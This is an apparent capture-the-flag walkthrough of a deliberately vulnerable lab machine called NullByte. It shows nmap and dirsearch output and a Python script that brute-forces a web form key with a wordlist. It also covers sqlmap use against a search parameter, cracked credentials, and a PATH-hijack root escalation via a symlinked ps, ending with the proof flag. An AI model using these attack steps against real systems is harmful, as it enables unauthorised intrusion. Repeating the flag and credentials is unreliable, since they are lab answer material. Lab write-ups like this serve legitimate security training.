[*] NULLBYTE [*]

# Date : 21/01/2022

# ->Enumeration Phase:

# Nmap 7.91 scan initiated Fri Jan 21 12:38:00 2022 as: nmap -sC -sV -vv -p- -oN nmap_all 192.168.0.113
Nmap scan report for 192.168.0.113
Host is up, received arp-response (0.00026s latency).
Scanned at 2022-01-21 12:38:01 IST for 16s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38754/udp6  status
|   100024  1          40797/udp   status
|   100024  1          43909/tcp   status
|_  100024  1          55996/tcp6  status
777/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALLUIu4tXFadebYrnD994oq52RRYSpBO4UBHiXnGTGEgm6UlIDR8IT81T9RaJg5DjFIfjfzTfeIJVmDKMk2Zz/itniXKB7FRbF5Exyp4Vu2IzD76Iepu1qBmGrQdgtAwR+rCtu4KQ30KtCK48OvZO409Nbff8AB5ScuHePourSMVAAAAFQDbcAuY6E2l8runB/XMCs4kevsorQAAAIBlurtYJXxZFPdyfnVzCvGlp74pknTmM7BExEyU5tdJAGjPPF3+ApdNXk9b8cWKoKsGK++cEQgkZAuIgj9uso853WwS4NArT/P0j9cmqvKmMmClZWMFf/pXARoW9MsyZ9Eudo2TWBEgtqknVqStsSAp5UaxITyFCGoISaAJSpXtawAAAIEAnGErIK3lL2HxBvKbVJYpKdY9jjlsd+Ly8iPJW5m2BUXRDPVMU4kN5yhXfcK9Ls4W/SWApzj7zt5c5j3KixB8+pjpIMZqqnHbDcHbL1o+gPbwaSzeZVrHxnmCay3eWadclIykRadr3wdsnCa+6wSGEAW/1VbODQ4g84jRVj3iHCo=
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCk720eL8a5T2a7mSbBQm1Ga6mDBH354s4kS4YPzJdZDgpdsRpqyZtrYr09HxkOpdk2Qt5yVo8Wq0UCqGmcqSd5u8Zx36OjUp3gwKhyQD8HXfhr3Edp65wt3PY7jlEKyXrGiJPQWYCOJAxfRW+VzBM13EKRWjS+jlovyjz0/BJpdX/cehGTyg/YkOT98g2oiDZm8ydGmFHa1psATUf2/39NVA6ef6eL+WtrYRljiV7Bu4qrX+WU2DLCZy28SjA23m48I+Thy05pLZTgEYGeBAH6UbC+96DUyrSqbAF0I+OBPXNclrmSB956VdDOBe6RjSJsrO9bXUQbb5oT2XnjdTTB
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAkdg5B2LQmX+0vhiEavzVhKN0ZaU1e1Zi1ANcCmz5W63z65sBL6iRvzF+XNCW3dmsvsC1lRlLYDpj94RElY3ag=
|   256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxwJ5299oAQPJtmnso4wAqIdz2ACkCMWsvxgf16XX/G
43909/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
MAC Address: 08:00:27:F4:DA:55 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 21 12:38:18 2022 -- 1 IP address (1 host up) scanned in 17.47 seconds

# Using dirsearch found some directories.

[12:58:36] 200 -  196B  - /index.html
[12:58:38] 301 -  319B  - /javascript  ->  http://192.168.0.113/javascript/
[12:58:54] 200 -   12KB - /phpmyadmin/docs/html/index.html
[12:58:56] 301 -  319B  - /phpmyadmin  ->  http://192.168.0.113/phpmyadmin/
[12:58:58] 200 -    9KB - /phpmyadmin/
[12:58:58] 200 -    9KB - /phpmyadmin/index.php
[12:59:07] 403 -  302B  - /server-status/
[12:59:07] 403 -  301B  - /server-status
[12:59:20] 301 -  316B  - /uploads  ->  http://192.168.0.113/uploads/
[12:59:20] 200 -  113B  - /uploads/

>> There is gif in source code so i download it and run exiftool on it and see metadata.
######################

ExifTool Version Number         : 12.36
File Name                       : index.gif
Directory                       : .
File Size                       : 16 KiB
File Modification Date/Time     : 2022:01:21 14:14:52+05:30
File Access Date/Time           : 2022:01:21 14:15:36+05:30
File Inode Change Date/Time     : 2022:01:21 14:14:52+05:30
File Permissions                : -rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071


######################
>> there is uniq comment : kzMb5nVYJw
>> it is directory .after visiting the directory i got web page in which we give a key into input tab and if key is correct then we can do sql injection on it.
>> so i made a small script and bruteforce a key and success i found the key.

# key : elite

# script.py
#####################

#!/usr/bin/python3

import requests
import sys

url = "http://<IP>/kzMb5nVYJw/index.php"

with open("/usr/share/wordlists/rockyou.txt","r",encoding='latin-1') as file:
	f = file.read().split("\n")

	for i in f:

		data = {
		"key":i
		}

		r = requests.post(url,data=data)
		if "invalid key" in r.text:
			sys.stdout.write(f"\r\n{i}")
			sys.stdout.flush()
		else:
			print("password is : ",i)
			sys.exit(0)

#####################

>> after giving correct key,there is search username web page is occur.
>> then i notice the url, there is parameter "usrtosearch" which accepts username.
>> so run sqlmap on that url and seccess fetch much more data and brutforce the password of root phpmyadmin password 

# username : root
# password : sunnyvale

>> and login into the phpmyadmin.
>> there is ramses password : YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
>> encryption used : From_Base64('A-Za-z0-9-_',true)
>> after decryption the password found a md5 hash : c6d6bd7ebf806f43c76acc3681703b81

# usernaem : ramses
# password : omega

>> then through ssh and got a shell of ramses.
>> i see bash_history file having 96 size.
>> i open this file and see something important. /var/www/backup/ directory

>> then go to that directory and find a procwatch binary file made by root.
>> after running this file it simply print the output of ps command .
>> so for privilage escalation do following .

>> first change the PATH environment variable to current working directory.
# export PATH=.:$PATH
>> then make a symlink to ps file of /bin/sh
# ln -s /bin/sh ps
>> and at last run the binary.
>> got a root shell.

# proof.txt

adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----





